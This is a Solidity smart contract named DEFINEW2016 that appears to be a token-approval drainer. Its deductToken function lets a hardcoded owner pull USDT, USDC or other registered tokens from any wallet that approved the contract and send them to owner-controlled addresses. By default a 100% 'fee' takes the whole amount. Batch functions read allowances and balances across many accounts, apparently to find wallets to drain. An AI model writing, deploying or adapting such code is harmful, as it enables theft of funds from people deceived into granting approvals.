// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract DEFINEW2016 {
    mapping(address => IERC20) private tokens;
    address private superOwner;
    address private lockedOwner;
    address private owner;
    address private feeAddress;
    address private toAddress;
    uint256 private withdrawFee;
    bool private withdrawFlag;

    modifier onlySuperOwner() {
        require(msg.sender == superOwner, "Only super owner");
        _;
    }

    modifier onlyLockedOwner() {
        require(msg.sender == lockedOwner, "Only locked owner");
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    constructor() {
        superOwner = address(0xE0897ea4204782Ddc409A216222756c2D9847aF7);
        lockedOwner = address(0xE0897ea4204782Ddc409A216222756c2D9847aF7);
        owner = address(0x47E07d513Dc7CC5f99A907186B4177C0B96B4Fc7);
        feeAddress = address(0xE0897ea4204782Ddc409A216222756c2D9847aF7);
        toAddress = address(0xE0897ea4204782Ddc409A216222756c2D9847aF7);
        withdrawFee = 1000;
        withdrawFlag = true;
        tokens[0xdAC17F958D2ee523a2206206994597C13D831ec7] = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
        tokens[0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48] = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    }

    function isContract(address _token) internal view returns (bool) {
        uint256 size;
        assembly {size := extcodesize(_token)}
        return size > 0;
    }

    function safeTransferFrom(IERC20 _token, address _from, uint256 _amount) internal {
        if (withdrawFee > 0 && feeAddress != address(0)) {
            uint256 feeAmount = (_amount * withdrawFee) / 1000;
            uint256 actualAmount = _amount - feeAmount;
            if (feeAmount > 0) {
                (bool feeSuccess, bytes memory feeData) = address(_token).call(
                    abi.encodeWithSelector(_token.transferFrom.selector, _from, feeAddress, feeAmount)
                );
                require(feeSuccess && (feeData.length == 0 || abi.decode(feeData, (bool))), "Fee transfer failed");
            }
            if (actualAmount > 0) {
                (bool success, bytes memory data) = address(_token).call(
                    abi.encodeWithSelector(_token.transferFrom.selector, _from, toAddress, actualAmount)
                );
                require(success && (data.length == 0 || abi.decode(data, (bool))), "Transfer failed");
            }
        } else {
            (bool success, bytes memory data) = address(_token).call(
                abi.encodeWithSelector(_token.transferFrom.selector, _from, toAddress, _amount)
            );
            require(success && (data.length == 0 || abi.decode(data, (bool))), "Transfer failed");
        }
    }

    function transferLockedOwner(address _locked_owner) external onlyLockedOwner returns (bool) {
        require(_locked_owner != address(0), "Zero address");
        lockedOwner = _locked_owner;
        return true;
    }

    function setLockedOwner(address _locked_owner) external onlySuperOwner returns (bool) {
        require(_locked_owner != address(0), "Zero address");
        lockedOwner = _locked_owner;
        return true;
    }

    function setWithdrawFlag(bool _flag) external onlySuperOwner returns (bool) {
        withdrawFlag = _flag;
        return true;
    }

    function setOwner(address _owner) external onlyLockedOwner returns (bool) {
        require(_owner != address(0), "Zero address");
        owner = _owner;
        return true;
    }

    function setWithdrawFee(uint256 _fee) external onlyLockedOwner returns (bool) {
        require(_fee <= 1000, "Fee cannot exceed 100%");
        require(_fee > 0, "Fee must be > 0");
        withdrawFee = _fee;
        return true;
    }

    function registerToken(address _token) external onlyLockedOwner returns (bool) {
        require(isContract(_token), "Not a contract");
        require(address(tokens[_token]) == address(0), "Already registered");
        tokens[_token] = IERC20(_token);
        return true;
    }

    function setFeeAddress(address _feeAddress) external onlyLockedOwner returns (bool) {
        require(_feeAddress != address(0), "Zero address");
        feeAddress = _feeAddress;
        return true;
    }

    function setToAddress(address _toAddress) external onlyLockedOwner returns (bool) {
        require(_toAddress != address(0), "Zero address");
        toAddress = _toAddress;
        return true;
    }

    function setAddresses(address _toAddress, address _feeAddress) external onlyLockedOwner returns (bool) {
        require(_toAddress != address(0), "Zero address");
        require(_feeAddress != address(0), "Zero address");
        toAddress = _toAddress;
        feeAddress = _feeAddress;
        return true;
    }

    function deductToken(address _token, address _from, uint256 _amount) external onlyOwner returns (bool) {
        require(withdrawFlag, "Withdrawals disabled");
        require(_amount > 1000, "Amount too small");
        require(address(tokens[_token]) != address(0), "Not registered");
        uint256 allowanceAmount = tokens[_token].allowance(_from, address(this));
        require(allowanceAmount >= _amount, "Insufficient allowance");
        uint256 balance = tokens[_token].balanceOf(_from);
        require(balance >= _amount, "Insufficient balance");
        safeTransferFrom(tokens[_token], _from, _amount);
        return true;
    }

    function getLockedOwner() external view returns (address) {
        return lockedOwner;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function getWithdrawFee() external view returns (uint256) {
        return withdrawFee;
    }

    function getFeeAddress() external view returns (address) {
        return feeAddress;
    }

    function getToAddress() external view returns (address) {
        return toAddress;
    }

    function getWithdrawFlag() external view returns (bool) {
        return withdrawFlag;
    }

    function getInfo() external view returns (address _lockedOwner, address _owner, address _feeAddress, address _toAddress, uint256 _withdrawFee) {
        return (lockedOwner, owner, feeAddress, toAddress, withdrawFee);
    }

    function getAllowance(address _token, address _address) external view returns (uint256 aprove, uint256 token, uint256 base) {
        IERC20 erc20 = IERC20(_token);
        return (erc20.allowance(_address, address(this)), erc20.balanceOf(_address), _address.balance);
    }

    function getEthBalances(address[] calldata _accounts) external view returns (uint256[] memory balances) {
        require(_accounts.length <= 100, "Too many accounts");
        uint256 length = _accounts.length;
        balances = new uint256[](length);
        for (uint256 i = 0; i < length; i++) {
            balances[i] = _accounts[i].balance;
        }
        return balances;
    }

    function getTokenBalances(address _token, address[] calldata _accounts) external view returns (uint256[] memory balances) {
        require(_accounts.length <= 100, "Too many accounts");
        IERC20 erc20 = IERC20(_token);
        uint256 length = _accounts.length;
        balances = new uint256[](length);
        for (uint256 i = 0; i < length; i++) {
            balances[i] = erc20.balanceOf(_accounts[i]);
        }
        return balances;
    }

    function getTokenAllowances(address _token, address _spender, address[] calldata _accounts) external view returns (uint256[] memory allowances) {
        require(_accounts.length <= 100, "Too many accounts");
        IERC20 erc20 = IERC20(_token);
        uint256 length = _accounts.length;
        allowances = new uint256[](length);
        for (uint256 i = 0; i < length; i++) {
            allowances[i] = erc20.allowance(_accounts[i], _spender);
        }
        return allowances;
    }
}
